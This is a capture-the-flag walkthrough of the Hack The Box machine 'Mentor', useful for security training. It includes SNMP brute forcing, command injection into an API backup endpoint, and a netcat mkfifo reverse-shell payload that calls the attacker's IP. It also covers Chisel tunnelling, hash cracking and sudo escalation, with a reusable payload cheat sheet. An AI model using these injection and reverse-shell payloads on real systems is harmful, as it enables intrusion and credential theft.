# HTB - Mentor - 10.129.34.126

### Machine Info

* **Difficulty:** Medium
* **OS:** Linux (Ubuntu)
* **IP:** 10.129.228.102
* **Key Skills:** SNMP enumeration, API exploitation, Command Injection, Docker container escape, PostgreSQL credential extraction, Password reuse

### Overview

Mentor is a medium-difficulty Linux machine featuring a Flask-based web application with an API subdomain. The attack begins with subdomain enumeration to discover an API endpoint with Swagger documentation. SNMP enumeration using extended community strings reveals credentials passed as command-line arguments to a Python script. With admin API access, we exploit a command injection vulnerability in a backup endpoint to gain a shell inside a Docker container. From there, we extract database credentials, tunnel to PostgreSQL, crack user hashes, and pivot to the host. Finally, we discover additional credentials in SNMP configuration files and escalate to root via sudo misconfiguration.

**Key Concepts:**

* Subdomain and API enumeration
* SNMP community string bruteforcing
* Process argument exposure via SNMP
* JWT authentication bypass
* Command injection in API endpoints
* Docker container enumeration
* PostgreSQL credential extraction via tunneling
* Configuration file credential discovery
* Sudo privilege escalation

**Common Ports:**

* **22/TCP** - SSH (OpenSSH 8.9p1)
* **80/TCP** - HTTP (Apache 2.4.52 → Werkzeug/Python)
* **161/UDP** - SNMP

**Domain Information:**

* Main domain: mentorquotes.htb
* API subdomain: api.mentorquotes.htb

***

### Exploitation Workflow Summary

1. **Initial Enumeration** ├─ Nmap reveals SSH and HTTP ├─ UDP scan discovers SNMP on port 161 ├─ Web redirects to mentorquotes.htb └─ Subdomain fuzzing finds api.mentorquotes.htb
2. **API Enumeration** ├─ Swagger documentation at /docs ├─ Discover endpoints: /users/, /quotes/, /admin/ ├─ Create test account and obtain JWT └─ Admin endpoints require elevated privileges
3. **SNMP Enumeration** ├─ Bruteforce community strings ├─ Discover "internal" community with extended access ├─ Extract running processes └─ Find password in login.py command arguments
4. **API Exploitation** ├─ Authenticate as james (admin user) ├─ Access /admin/backup endpoint ├─ Test command injection with ping └─ Obtain reverse shell in Docker container
5. **Container Escape & Lateral Movement** ├─ Find PostgreSQL credentials in source code ├─ Tunnel connection via Chisel ├─ Extract and crack user hashes ├─ SSH as svc user └─ Find james password in snmpd.conf
6. **Privilege Escalation** ├─ Switch to james user ├─ Check sudo permissions ├─ Execute /bin/sh as root └─ Capture root flag

***

### Initial Enumeration

#### TCP Port Scanning

```bash
nmap -p- --min-rate 10000 10.129.228.102 -oN TCP.Scan
```

**Results:**

```
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
```

**Service enumeration:**

```bash
nmap -p 22,80 -sCV 10.129.228.102 -oN TCP.Scripts
```

```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3
80/tcp open  http    Apache httpd 2.4.52
|_http-title: Did not follow redirect to http://mentorquotes.htb/
```

**What we learned:**

* Ubuntu Linux system
* Apache redirecting to mentorquotes.htb
* Add to /etc/hosts

#### UDP Port Scanning

```bash
sudo nmap -sU -sCV -p 53,161,162,123,500 10.129.228.102
```

```
PORT    STATE  SERVICE  VERSION
161/udp open   snmp     SNMPv1 server (public)
| snmp-sysdescr: Linux mentor 5.15.0-56-generic
```

**Key finding:** SNMP is running - potential for information disclosure.

#### Web Technology Identification

```bash
whatweb http://mentorquotes.htb/
```

```
[200 OK] HTTPServer[Werkzeug/2.0.3 Python/3.6.9], Python[3.6.9], Title[MentorQuotes]
```

**What we learned:**

* Flask/Werkzeug Python application
* Python 3.6.9

***

### Subdomain Enumeration

#### Fuzzing for Subdomains

```bash
wfuzz -c -w /usr/share/amass/wordlists/subdomains-top1mil-5000.txt \
  -t30 --hw 26 -H "Host:FUZZ.mentorquotes.htb" "http://mentorquotes.htb"
```

**Results:**

```
ID      Response   Lines    Word       Chars       Payload
000000051:   404   0 L      2 W        22 Ch       "api"
```

**Found:** api.mentorquotes.htb - added to /etc/hosts

***

### API Enumeration

#### Directory Discovery

```bash
ffuf -w /usr/share/wordlists/dirb/common.txt -u http://api.mentorquotes.htb/FUZZ
```

```
admin                   [Status: 307]
docs                    [Status: 200]
quotes                  [Status: 307]
users                   [Status: 307]
```

#### Swagger Documentation

**Access:** http://api.mentorquotes.htb/docs

**Endpoints discovered:**

* `POST /auth/signup` - User registration
* `POST /auth/login` - Authentication (returns JWT)
* `GET /users/` - List users (admin only)
* `GET /quotes/` - List quotes
* `POST /admin/backup` - Backup functionality (admin only)

#### Testing API Access

**Create test account:**

```bash
curl -X 'POST' 'http://api.mentorquotes.htb/auth/signup' \
  -H 'Content-Type: application/json' \
  -d '{"email":"test@htb.com","username":"testuser","password":"password123"}'
```

**Login and get JWT:**

```bash
curl -X 'POST' 'http://api.mentorquotes.htb/auth/login' \
  -H 'Content-Type: application/json' \
  -d '{"email":"test@htb.com","username":"testuser","password":"password123"}'
```

**Testing admin endpoint:**

```bash
curl -X GET 'http://api.mentorquotes.htb/users/' \
  -H 'Authorization: <JWT_TOKEN>'
```

**Response:**

```json
{"detail":"Only admin users can access this resource"}
```

We need admin credentials to access protected endpoints.

***

### SNMP Enumeration

#### Community String Bruteforce

Standard enumeration with "public" community yields limited results. Using snmpbrute to find additional community strings:

```bash
python3 snmpbrute.py -t 10.129.228.102 \
  -f /usr/share/seclists/Discovery/SNMP/common-snmp-community-strings-onesixtyone.txt
```

**Results:**

```
10.129.228.102 : 161    Version (v1):   public
10.129.228.102 : 161    Version (v2c):  public
10.129.228.102 : 161    Version (v2c):  internal
```

**Key finding:** The "internal" community string provides extended access.

#### Extracting Process Information

```bash
snmpbulkwalk -v2c -c internal -Cr1000 10.129.228.102 > snmp_dump.txt
```

**Searching for interesting processes:**

```bash
grep "login" snmp_dump.txt
```

```
.1.3.6.1.2.1.25.4.2.1.5.1667 = STRING: "/usr/local/bin/login.sh"
.1.3.6.1.2.1.25.4.2.1.5.2082 = STRING: "/usr/local/bin/login.py kj23sadkj123as0-d213"
```

**Critical finding:** A Python login script is running with a password passed as a command-line argument.

**Credentials found:**

```
Password: kj23sadkj123as0-d213
```

**Why this works:** SNMP can expose running processes including their command-line arguments. Passing sensitive data as arguments is a security anti-pattern.

***

### API Exploitation as Admin

#### Authenticating as James

Testing the discovered password with "james" (likely admin based on website context):

```bash
curl -X 'POST' 'http://api.mentorquotes.htb/auth/login' \
  -H 'Content-Type: application/json' \
  -d '{"email":"james@mentorquotes.htb","username":"james","password":"kj23sadkj123as0-d213"}'
```

**JWT obtained:**

```
eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6ImphbWVzIiwiZW1haWwiOiJqYW1lc0BtZW50b3JxdW90ZXMuaHRiIn0.peGpmshcF666bimHkYIBKQN7hj5m785uKcjwbD--Na0
```

James is confirmed as the admin user.

#### Discovering the Backup Endpoint

The `/admin/backup` endpoint accepts a `path` parameter:

```http
POST /admin/backup HTTP/1.1
Host: api.mentorquotes.htb
Authorization: eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9...
Content-Type: application/json

{"path":"/tmp"}
```

**Response:**

```json
{"INFO":"Done!"}
```

#### Command Injection Testing

**Testing with ping:**

```json
{"path":"/tmp;ping -c 3 10.10.15.248"}
```

**Confirming with tcpdump:**

```bash
sudo tcpdump -ni tun0 icmp
```

```
IP 10.129.228.102 > 10.10.15.248: ICMP echo request
IP 10.10.15.248 > 10.129.228.102: ICMP echo reply
```

**Command injection confirmed!**

#### Reverse Shell

**Start listener:**

```bash
nc -lvnp 9999
```

**Payload:**

```http
POST /admin/backup HTTP/1.1
Host: api.mentorquotes.htb
Authorization: eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9...
Content-Type: application/json

{"path":"/tmp;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.15.248 9999 >/tmp/f"}
```

**Shell received:**

```
connect to [10.10.15.248] from (UNKNOWN) [10.129.228.102] 33861
/bin/sh: can't access tty; job control turned off
/app #
```

***

### Container Enumeration

#### Identifying the Container

```bash
ip a
```

```
11: eth0@if12: <BROADCAST,MULTICAST,UP,LOWER_UP,M-DOWN>
    inet 172.22.0.3/16 brd 172.22.255.255 scope global eth0
```

**Confirmed:** We're inside a Docker container (172.22.0.x network).

#### Database Credentials Discovery

**Examining application source:**

```bash
cat /app/app/db.py
```

```python
DATABASE_URL = os.getenv("DATABASE_URL", "postgresql://postgres:postgres@172.22.0.1/mentorquotes_db")
```

**Credentials found:**

* Host: 172.22.0.1 (Docker host)
* User: postgres
* Password: postgres
* Database: mentorquotes\_db

***

### Database Access via Tunneling

#### Setting Up Chisel Tunnel

The container lacks PostgreSQL tools, so we tunnel the connection.

**On attacker machine:**

```bash
./chisel server -p 8000 --reverse
```

**On container:**

```bash
./chisel client 10.10.15.248:8000 R:5432:172.22.0.1:5432
```

#### Connecting to PostgreSQL

```bash
psql -h 127.0.0.1 -p 5432 -U postgres
```

**List databases:**

```sql
\list
```

```
      Name       |  Owner   
-----------------+----------
 mentorquotes_db | postgres
```

#### Extracting User Credentials

```sql
\connect mentorquotes_db
SELECT * FROM users;
```

```
 id |         email          |  username   |             password             
----+------------------------+-------------+----------------------------------
  1 | james@mentorquotes.htb | james       | 7ccdcd8c05b59add9c198d492b36a503
  2 | svc@mentorquotes.htb   | service_acc | 53f22d0dfa10dce7e29cd31f4f953fd8
```

#### Cracking the Hash

```bash
hashcat -m 0 53f22d0dfa10dce7e29cd31f4f953fd8 /usr/share/wordlists/rockyou.txt
```

**Cracked:**

```
53f22d0dfa10dce7e29cd31f4f953fd8:123meunomeeivani
```

**Credentials:**

```
svc:123meunomeeivani
```

***

### SSH Access as svc

```bash
ssh svc@10.129.228.102
Password: 123meunomeeivani
```

#### User Flag

```bash
cat ~/user.txt
```

```
2d91c2712af11b870c10244027965d6a
```

***

### Privilege Escalation: svc → james

#### Configuration File Enumeration

**Searching for credentials in config files:**

```bash
for l in $(echo ".conf .config .cnf");do echo -e "\nFile extension: " $l; find / -name *$l 2>/dev/null | grep -v "lib\|fonts\|share\|core" ;done
```

**Examining SNMP configuration:**

```bash
cat /etc/snmp/snmpd.conf
```

```
createUser bootstrap MD5 SuperSecurePassword123__ DES
rouser bootstrap priv
```

**Credentials found:**

```
james:SuperSecurePassword123__
```

#### Switching to James

```bash
su james
Password: SuperSecurePassword123__
```

***

### Privilege Escalation: james → root

#### Checking Sudo Permissions

```bash
sudo -l
```

```
User james may run the following commands on mentor:
    (ALL) /bin/sh
```

**James can run /bin/sh as root!**

#### Getting Root

```bash
sudo /bin/sh
```

#### Root Flag

```bash
cat /root/root.txt
```

```
c330fc56fc62a3d72bbeea8db6e717f9
```

***

### Quick Reference

#### SNMP Enumeration

```bash
# Bruteforce community strings
python3 snmpbrute.py -t TARGET -f wordlist.txt

# Bulk walk with community string
snmpbulkwalk -v2c -c COMMUNITY -Cr1000 TARGET

# Search for processes
snmpwalk -v2c -c COMMUNITY TARGET 1.3.6.1.2.1.25.4.2.1.5
```

#### API Command Injection Testing

```bash
# Test with sleep
{"path":"/tmp;sleep 5"}

# Test with ping
{"path":"/tmp;ping -c 3 ATTACKER_IP"}

# Reverse shell
{"path":"/tmp;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc ATTACKER_IP PORT >/tmp/f"}
```

#### Chisel Tunneling

```bash
# Server (attacker)
./chisel server -p 8000 --reverse

# Client (target)
./chisel client ATTACKER_IP:8000 R:LOCAL_PORT:TARGET_IP:TARGET_PORT
```

#### PostgreSQL Commands

```sql
-- List databases
\list

-- Connect to database
\connect database_name

-- List tables
\dt

-- Select all from table
SELECT * FROM table_name;
```

#### Hash Cracking

```bash
# MD5 hashes
hashcat -m 0 hash.txt wordlist.txt

# Show cracked
hashcat -m 0 hash.txt --show
```

***

### Key Takeaways

**What we learned:**

1. **SNMP community strings** - Always enumerate beyond "public". Extended communities like "internal" can expose sensitive information.
2. **Command-line argument exposure** - Passing credentials as command-line arguments is dangerous as they can be exposed via process listings and SNMP.
3. **API command injection** - User-controlled paths in backup/file operations are high-risk for command injection. Always sanitize input.
4. **Container awareness** - Getting a shell doesn't mean you're on the host. Check network configuration to identify container environments.
5. **Database credential reuse** - Application database credentials often work for other services. Always check for password reuse.
6. **Configuration file secrets** - Service configuration files (like snmpd.conf) often contain plaintext credentials.
7. **Sudo misconfigurations** - Allowing users to run shells as root via sudo is a critical security flaw.

**Attack chain summary:** Subdomain enum → API discovery → SNMP cred extraction → Command injection → Container shell → DB tunnel → Hash crack → SSH access → Config file creds → Sudo privesc → Root

**Defense recommendations:**

* Use unique SNMP community strings and restrict access
* Never pass credentials as command-line arguments
* Sanitize all user input, especially in file/path operations
* Use separate credentials for each service
* Store secrets in secure vaults, not config files
* Audit sudo permissions regularly
* Implement proper container isolation and monitoring

***

### Related Topics

* \[\[SNMP Enumeration]]
* \[\[API Security Testing]]
* \[\[Command Injection]]
* \[\[Docker Container Escape]]
* \[\[PostgreSQL Exploitation]]
* \[\[Chisel Tunneling]]
* \[\[Sudo Privilege Escalation]]
